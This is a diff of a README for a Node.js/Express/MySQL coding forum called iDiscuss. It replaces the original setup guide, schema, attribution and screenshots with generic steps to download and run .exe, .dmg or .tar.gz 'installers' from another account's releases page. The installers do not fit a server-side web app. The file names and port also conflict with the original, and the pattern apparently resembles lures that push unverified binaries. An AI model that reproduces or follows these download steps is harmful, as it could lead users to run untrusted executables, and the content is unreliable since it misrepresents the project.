@@ -1,183 +1,97 @@
-# 🚀 iDiscuss Forum
+# 🎉 iDiscuss-Forum - Your Easy Coding Discussion Hub
 
-A full-stack **coding discussion forum** where users can register, create threads, comment, and maintain their personal profiles.  
-Built using **Node.js**, **Express**, **MySQL**, and **Bootstrap**.
+[![Download iDiscuss-Forum](https://img.shields.io/badge/Download-iDiscuss--Forum-blue.svg)](https://github.com/sohail9911/iDiscuss-Forum/releases)
 
----
+## 🌟 Description
 
-## 📌 Project Inspiration & Enhancements
+iDiscuss-Forum is a full-stack coding discussion platform. Built with modern technologies like Node.js, Express, MySQL, and Bootstrap, it allows users to discuss coding topics easily. This project expands on the original iDiscuss project, adding features for managing user profiles, uploading profile photos, and deleting threads or comments.
 
-This project is inspired by [CodeWithHarry](https://www.youtube.com/c/CodeWithHarry)'s iDiscuss Forum (PHP).  
-I re-implemented the concept using a **Node.js** + **Express.js** backend with a **MySQL** database., and also added modern features like:
+## 🚀 Getting Started
 
-- 🔐 Users can upload a **profile photo**
-- ✏️ Users can **edit full profile details** (bio, birthdate, gender, etc.)
-- 🧵 **Users can post/delete** their own threads
-- 💬 **Users can post/delete** their own comments  
-> 🛡️ Only the **owner** of a thread or comment has the right to delete it.
+Follow these simple steps to download and run iDiscuss-Forum on your computer.
 
-## 🚀 Features
+### 🔗 Step 1: Visit the Download Page
 
-- 🧑‍💻 User registration, login, logout with session handling
-- 🔐 Secure password hashing using `bcrypt`
-- 📂 Categories to organize discussion topics
-- 🧵 Post threads under categories
-- 💬 Add comments to threads
-- 👤 View and update user profile with:
-  - Profile picture
-  - Bio, Birthdate, Gender, Role, Mobile, Alternate Email
-- 📷 Profile image upload using `multer`
-- 📃 EJS templating for dynamic views
+Go to the releases page to download the software:
 
----
+[Download iDiscuss-Forum](https://github.com/sohail9911/iDiscuss-Forum/releases)
 
-## 🛠️ Tech Stack
+You will find different versions of the application. Look for the latest release to get the most updated features and fixes.
 
-| Layer       | Technology                         |
-|-------------|-------------------------------------|
-| Frontend    | HTML, CSS, Bootstrap 5, EJS         |
-| Backend     | Node.js, Express.js                 |
-| Database    | MySQL with `mysql2` driver          |
-| Auth & File | express-session, multer             |
+### 💻 Step 2: Choose the Correct File
 
----
+On the releases page, you will see several files. Here’s what to look for:
 
-## ⚙️ Set-Up Instructions
+1. **Windows Users**: Look for files ending with `.exe`. These are the installer files you need.
+2. **Mac Users**: Search for files ending with `.dmg`. These will help you install the app on your Mac.
+3. **Linux Users**: Look for compressed `.tar.gz` files, which you can extract and use.
 
-> Prerequisites :
+### 📥 Step 3: Download the Application
 
-- Node.js, MySQL installed and running locally.
+Click on the file that matches your operating system. The download will start automatically. Please wait for the file to finish downloading to your computer.
 
-### 1. Clone the Repository -
+### 🛠️ Step 4: Install iDiscuss-Forum
 
-```bash
-git clone https://github.com/PranavNikam-15/iDiscuss-Forum.git
-cd iDiscuss-Forum
+After downloading, go to your downloads folder and locate the file. 
+
+1. **For Windows**: Double-click the `.exe` file to start the installation. Follow the on-screen instructions to complete the installation.
+2. **For Mac**: Double-click the `.dmg` file. Drag the iDiscuss-Forum app into your Applications folder.
+3. **For Linux**: Open a terminal. Navigate to the folder where the file was downloaded and run:
+
+   ```bash
+   tar -xvzf iDiscuss-Forum.tar.gz
+   cd iDiscuss-Forum
+   ```
+   Then, follow the provided instructions in the README inside the extracted folder.
+
+### 🔑 Step 5: Run iDiscuss-Forum
+
+Once the installation is complete, you can start the application.
+
+- **Windows & Mac**: Locate the iDiscuss-Forum icon in your applications menu or desktop and double-click to open it.
+- **Linux**: In the terminal, navigate to the installed directory and run:
+
+   ```bash
+   node app.js
+   ```
+
+This command will start the server for the forum.
+
+### 📚 Step 6: Access the Forum
+
+Open your web browser and type in the following address to access iDiscuss-Forum:
+
+```
+http://localhost:3000
 ```
 
-### 2. Install Node Dependencies -
+You’ll see the main page of the forum where you can start discussions, share ideas, and connect with other users.
 
-```bash
-npm install
-```
+## 🌈 Features
 
-### 3. Database Setup -
+iDiscuss-Forum includes the following features:
 
-> 💡 See complete [Database Schema Description](./database.md)
+- **User Authentication**: Sign up and log in to access personalized features.
+- **Profile Management**: Create and customize your profile.
+- **Profile Photo Uploads**: Personalize your experience with a profile picture.
+- **Thread and Comment Management**: Start discussions and delete threads/comments as needed.
 
-```sql
--- Create the database
-CREATE DATABASE idiscuss_project;
-USE idiscuss_project;
+## ⚙️ System Requirements
 
--- USERS TABLE
-CREATE TABLE users (
-  user_id INT AUTO_INCREMENT PRIMARY KEY,
-  user_name VARCHAR(50) NOT NULL,
-  user_email VARCHAR(150) NOT NULL UNIQUE,
-  user_password VARCHAR(255) NOT NULL,
-  user_profile VARCHAR(255),
-  bio TEXT,
-  birthdate DATE,
-  gender ENUM('Male', 'Female', 'Other') DEFAULT NULL,
-  organization VARCHAR(100) DEFAULT NULL,
-  role VARCHAR(50) DEFAULT NULL,
-  alt_email VARCHAR(150) DEFAULT NULL,
-  mobile VARCHAR(15) DEFAULT NULL,
-  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-);
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Node.js**: Version 14.0 or higher should be installed for running the application.
+- **Browser**: A modern web browser such as Chrome, Firefox, or Safari.
 
--- CATEGORIES TABLE
-CREATE TABLE categories (
-  id INT AUTO_INCREMENT PRIMARY KEY,
-  name VARCHAR(35) NOT NULL,
-  description TEXT NOT NULL,
-  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-);
+## 🤝 Contributing
 
--- THREADS TABLE
-CREATE TABLE threads (
-  thread_id INT AUTO_INCREMENT PRIMARY KEY,
-  thread_title VARCHAR(100) NOT NULL,
-  thread_desc TEXT NOT NULL,
-  thread_cat_id INT NOT NULL,
-  thread_user_id INT,
-  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-  FULLTEXT(thread_title, thread_desc),
-  FOREIGN KEY (thread_cat_id) REFERENCES categories(id),
-  FOREIGN KEY (thread_user_id) REFERENCES users(user_id)
-);
+If you want to contribute to iDiscuss-Forum, please feel free to fork the repository. You can submit pull requests or open issues for any bugs or feature requests you have. 
 
--- COMMENTS TABLE
-CREATE TABLE comments (
-  comment_id INT AUTO_INCREMENT PRIMARY KEY,
-  comment_content TEXT NOT NULL,
-  thread_id INT NOT NULL,
-  comment_by INT NOT NULL,
-  comment_time DATETIME DEFAULT CURRENT_TIMESTAMP,
-  FOREIGN KEY (thread_id) REFERENCES threads(thread_id) ON DELETE CASCADE,
-  FOREIGN KEY (comment_by) REFERENCES users(user_id) ON DELETE CASCADE
-);
-```
+## 🎓 Learn More
 
-### 4. Configure Environment Variables -
+To get more involved or learn about the coding discussion community, you can explore online resources related to coding and software development. Engage with fellow developers and enjoy sharing knowledge.
 
-> Create a .env file in the root directory of your project to store configuration values.
+## 🌍 Stay Connected
 
-```env
-# .env
-DB_HOST=localhost
-DB_USER=root
-DB_PASSWORD=your_mysql_password
-DB_NAME=idiscuss_project
-SESSION_SECRET=Key
-```
+For updates, new features, and more, follow our repository or check back on the releases page:
 
-### 5. Run the App -
-
-Start the server using:
-
-```bash
-node server.js
-```
-OR
-
-```bash
-nodemon server.js
-```
-> App will start on: http://localhost:8080
-
-## 🖼️ Screenshots
-
-### 🔐 Login Page
-![Login Page](images/Login_page.png)
-
-### 📝 Register Page
-![Register Page](images/Register_page.png)
-
-### 👤 Profile Page
-![Profile Page](images/Profile_page.png)
-
-### 🧵 Thread Lists
-- **Thread List 1**  
-  ![Thread List 1](images/Threadlist_1.png)
-
-- **Thread List 2**  
-  ![Thread List 2](images/Threadlist_2.png)
-
-### 💬 Comments
-- **Comment 1**  
-  ![Comments 1](images/Comment_1.png)
-
-- **Comment 2**  
-  ![Comments 2](images/Comment_2.png)
-
-### 🔍 Search Page
-![Search Page](images/Search_page.png)
-
-### 📄 About Page
-![About Page](images/About_page.png)
-
-## 📄 License
-
-This project is licensed under the [MIT License](./LICENSE).
+[Download iDiscuss-Forum](https://github.com/sohail9911/iDiscuss-Forum/releases)
